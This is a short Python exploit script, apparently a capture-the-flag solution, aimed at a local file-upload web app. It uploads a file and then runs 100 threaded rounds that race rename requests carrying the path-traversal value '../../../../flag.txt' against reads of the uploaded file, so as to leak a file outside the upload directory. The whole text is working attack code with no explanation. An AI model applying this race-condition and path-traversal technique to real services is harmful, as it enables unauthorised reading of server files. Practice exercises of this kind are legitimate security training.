import requests
import threading
import time

base_url = "http://localhost:5000"


def do_rename(uuid, new):
    requests.post(base_url + f'/rename/{uuid}', json={'new_filename': new})

def read():
    print(requests.get(base_url + f'/uploads/{uuid}').text)


result = requests.post(base_url + '/upload', files={'file': ('test1', "")}, allow_redirects=False).text
uuid = result.split('uploads/')[1].split('"')[0]


requests.post(base_url + f'/rename/{uuid}', json={'new_filename': 'up.txt'})


for i in range(100):
    t1 = threading.Thread(target=do_rename, args=(uuid,"../../../../flag.txt"))
    t2 = threading.Thread(target=read)

    t1.start()
    t2.start()

    t1.join()
    t2.join()